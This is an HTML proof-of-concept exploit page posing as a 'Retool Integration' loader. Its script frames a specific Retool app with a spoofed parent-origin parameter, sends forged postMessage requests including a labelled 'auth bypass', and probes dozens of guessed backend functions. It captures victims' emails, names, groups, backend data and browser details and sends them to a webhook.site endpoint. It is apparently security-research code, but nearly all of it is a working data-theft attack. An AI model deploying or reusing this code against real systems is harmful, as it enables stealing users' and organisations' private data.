<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Retool Integration</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #f5f5f5; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
  .box { background: #fff; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.08); padding: 32px 40px; text-align: center; max-width: 520px; }
  .spinner { width: 32px; height: 32px; border: 3px solid #e2e8f0; border-top-color: #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 16px; }
  @keyframes spin { to { transform: rotate(360deg); } }
  h2 { font-size: 16px; color: #1e293b; margin-bottom: 6px; }
  p { font-size: 13px; color: #64748b; }
  #log { margin-top: 16px; font-size: 11px; color: #94a3b8; max-height: 150px; overflow-y: auto; text-align: left; font-family: monospace; background: #f8fafc; border-radius: 4px; padding: 8px; }
  .log-line { padding: 2px 0; border-bottom: 1px solid #f1f5f9; word-break: break-all; }
  .good { color: #16a34a; font-weight: bold; }
</style>
</head>
<body>
<div class="box">
  <div class="spinner" id="spin"></div>
  <h2 id="msg">Establishing connection...</h2>
  <p id="sub">Please wait</p>
  <div id="log"></div>
</div>

<iframe id="f1" style="display:none;" sandbox="allow-scripts allow-same-origin allow-forms allow-popups"></iframe>

<script>
(function() {
  'use strict';

  var WH = 'https://webhook.site/82992a43-c436-48c6-a887-42bd38d712be';
  var ATK = location.origin;
  var APP_ID = '272a0bca-c978-11ef-bcec-bb34712e5ec6';
  var HOST = 'https://jonjos11.retool.com';

  // App URL with retool-parent-origin set to OUR origin
  var APP_URL = HOST + '/apps/' + APP_ID + '/asa/defaultPage?retool-parent-origin=' + encodeURIComponent(ATK);

  function X(payload) {
    var j = JSON.stringify(payload);
    if (navigator.sendBeacon) {
      navigator.sendBeacon(WH, new Blob([j], { type: 'text/plain' }));
    }
    new Image().src = WH + '?d=' + encodeURIComponent(j.slice(0, 1500));
  }

  function addLog(msg, cls) {
    console.log('[PoC]', msg);
    var el = document.getElementById('log');
    var line = document.createElement('div');
    line.className = 'log-line' + (cls ? ' ' + cls : '');
    line.textContent = msg;
    el.appendChild(line);
    el.scrollTop = el.scrollHeight;
  }

  function uid() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      var r = Math.random()*16|0, v = c==='x'?r:(r&0x3|0x8);
      return v.toString(16);
    });
  }

  // ================================================================
  // ATTACK: Iframe the editor with retool-parent-origin bypass
  // Then PROBE for backend functions that return real data
  // ================================================================
  var pendingRequests = {};
  var probeCount = 0;

  // Common backend function names to probe
  var probes = [
    // User-related
    'getCurrentUser', 'get_user', 'getUser', 'currentUser', 'current_user',
    'fetchUser', 'fetch_user', 'me', 'getMe', 'getProfile', 'userProfile',
    'getCurrentUserId', 'get_user_info', 'getUserInfo',
    // Org-related
    'getOrganization', 'get_organization', 'getOrg', 'getCurrentOrg',
    'fetchOrganization', 'organization', 'getOrgUsers', 'listUsers',
    'getOrganizationUsers', 'fetchUsers',
    // App/data-related
    'getAppData', 'getData', 'fetchData', 'loadData', 'getInitialData',
    'getPageData', 'getTableData', 'query1', 'query_1', 'getRecords',
    // Generic
    'init', 'initialize', 'load', 'setup', 'bootstrap', 'getConfig',
  ];

  function probeBackendFunction(functionName, params) {
    var requestId = uid();
    pendingRequests[requestId] = { functionName: functionName, params: params, time: Date.now() };
    probeCount++;

    try {
      document.getElementById('f1').contentWindow.postMessage({
        type: 'RETOOL_BACKEND_FUNCTION',
        requestId: requestId,
        functionName: functionName,
        params: params || {}
      }, '*');
    } catch(e) {}
  }

  function probeAll() {
    addLog('Probing ' + probes.length + ' backend functions...');

    // Send probes in batches to avoid flooding
    var i = 0;
    var batch = setInterval(function() {
      if (i >= probes.length) {
        clearInterval(batch);
        addLog('All probes sent (' + probeCount + ' total)');
        X({ event: 'probes_complete', count: probeCount, pendingRequests: Object.keys(pendingRequests).length, time: new Date().toISOString() });
        return;
      }

      var batchSize = 3;
      for (var j = 0; j < batchSize && i < probes.length; j++, i++) {
        probeBackendFunction(probes[i]);
      }
    }, 500);
  }

  function iframeRetoolApp() {
    var f = document.getElementById('f1');
    f.src = APP_URL;

    f.onload = function() {
      addLog('App loaded, starting probes...', 'good');
      X({ event: 'app_loaded', url: APP_URL, time: new Date().toISOString() });

      // Wait for app to initialize, then probe
      setTimeout(function() {
        // First try passive: send RETOOL_CURRENT_USER_REQUEST
        addLog('Sending RETOOL_CURRENT_USER_REQUEST...');
        try {
          f.contentWindow.postMessage(
            { type: 'RETOOL_CURRENT_USER_REQUEST' },
            '*'
          );
        } catch(e) {}

        // Then aggressively probe backend functions
        setTimeout(probeAll, 3000);
      }, 4000);

      // Auth bypass
      setTimeout(function() {
        try {
          f.contentWindow.postMessage(
            { type: 'RETOOL_AUTH_COMPLETE', resourceName: '*' },
            '*'
          );
        } catch(e) {}
      }, 5000);
    };

    f.onerror = function() {
      addLog('Iframe blocked (X-Frame-Options?)', 'bad');
      X({ event: 'iframe_blocked', url: APP_URL, time: new Date().toISOString() });
      popupFallback();
    };
  }

  function popupFallback() {
    addLog('Trying popup instead...');
    var url = HOST + '/apps/' + APP_ID + '/editor?retool-parent-origin=' + encodeURIComponent(ATK);
    var popup = window.open(url, 're', 'width=1200,height=800,left='+((screen.width-1200)/2)+',top='+((screen.height-800)/2));
    if (!popup) { addLog('Popup blocked too', 'bad'); return; }
    addLog('Popup opened');
    X({ event: 'popup_opened', url: url, time: new Date().toISOString() });

    var i = 0;
    var interval = setInterval(function() {
      if (popup.closed) { clearInterval(interval); return; }
      i++;
      try {
        popup.postMessage({ type: 'RETOOL_CURRENT_USER_REQUEST' }, '*');
        if (i % 3 === 0 && probes[i/3]) {
          popup.postMessage({
            type: 'RETOOL_BACKEND_FUNCTION',
            requestId: uid(),
            functionName: probes[i/3 - 1],
            params: {}
          }, '*');
        }
      } catch(e) {}
    }, 2000);

    setTimeout(function() {
      clearInterval(interval);
      if (!popup.closed) popup.close();
    }, 90000);
  }

  // ================================================================
  // INTERCEPT ALL postMessages
  // ================================================================
  window.addEventListener('message', function(e) {
    var d = e.data;
    if (!d || typeof d !== 'object' || !d.type) return;

    var fromIframe = false;
    try {
      fromIframe = (e.source === document.getElementById('f1').contentWindow);
    } catch(ex) {}

    var dir = fromIframe ? '←RECV' : '→SENT';
    var summary = '';

    // Extract key info based on message type
    if (d.type === 'RETOOL_CURRENT_USER' && d.data) {
      summary = ' email=' + (d.data.email || '?') + ' name=' + (d.data.fullName || '?') +
                ' groups=' + JSON.stringify((d.data.groups || []).map(function(g){return g.name;}));
      if (fromIframe) {
        addLog('REAL USER DATA: ' + (d.data.email || d.data.fullName || JSON.stringify(d.data).slice(0,80)), 'good');
        document.getElementById('msg').textContent = 'REAL USER DATA!';
        document.getElementById('sub').textContent = d.data.email || d.data.fullName;
        document.getElementById('spin').style.display = 'none';
        X({ event: 'REAL_USER_DATA', userData: d.data, time: new Date().toISOString() });
      }
    } else if (d.type === 'RETOOL_BACKEND_RESULT') {
      summary = ' requestId=' + (d.requestId || '?').slice(0,8) + '...';
      if (d.requestId && pendingRequests[d.requestId]) {
        var req = pendingRequests[d.requestId];
        summary += ' fn=' + req.functionName;
        delete pendingRequests[d.requestId];
        addLog('BACKEND RESULT for: ' + req.functionName + ' — data captured!', 'good');
        X({
          event: 'BACKEND_RESULT_CAPTURED',
          functionName: req.functionName,
          requestId: d.requestId,
          data: d.data,
          time: new Date().toISOString()
        });
      }
    } else if (d.type === 'RETOOL_CURRENT_USER_REQUEST') {
      summary = ' (app requesting user data)';
      if (fromIframe) {
        addLog('App requests user from us — editor has no session data');
      }
    } else if (d.type === 'RETOOL_BACKEND_FUNCTION') {
      summary = ' fn=' + (d.functionName || '?');
    } else if (d.type === 'RETOOL_AUTH_COMPLETE') {
      summary = ' resource=' + (d.resourceName || '?');
    } else if (d.type === 'RR_OAUTH_RESOURCE') {
      summary = ' resource=' + (d.resourceName || '?');
      addLog('OAUTH resource requested: ' + (d.resourceName || '?'), 'good');
    }

    addLog(dir + ' ' + d.type + summary, (fromIframe && (d.type === 'RETOOL_CURRENT_USER' || d.type === 'RETOOL_BACKEND_RESULT')) ? 'good' : '');

    X({
      event: 'postmessage',
      direction: dir,
      type: d.type,
      data: d,
      origin: e.origin,
      time: new Date().toISOString()
    });
  });

  // ================================================================
  // START
  // ================================================================
  document.getElementById('msg').textContent = 'Ready';
  document.getElementById('sub').textContent = 'Click anywhere to begin';
  document.getElementById('spin').style.display = 'none';
  addLog('PoC ready — probes ' + probes.length + ' backend functions');

  document.body.addEventListener('click', function go() {
    document.body.removeEventListener('click', go);
    document.getElementById('msg').textContent = 'Attacking...';
    document.getElementById('sub').textContent = 'Iframing app + probing backend functions';
    document.getElementById('spin').style.display = 'block';

    X({ event: 'attack_start', attacker: ATK, host: HOST, appId: APP_ID, url: APP_URL, time: new Date().toISOString() });

    iframeRetoolApp();
  });

  X({ event: 'page_load', url: location.href, referrer: document.referrer, ua: navigator.userAgent, time: new Date().toISOString() });

})();
</script>
</body>
</html>
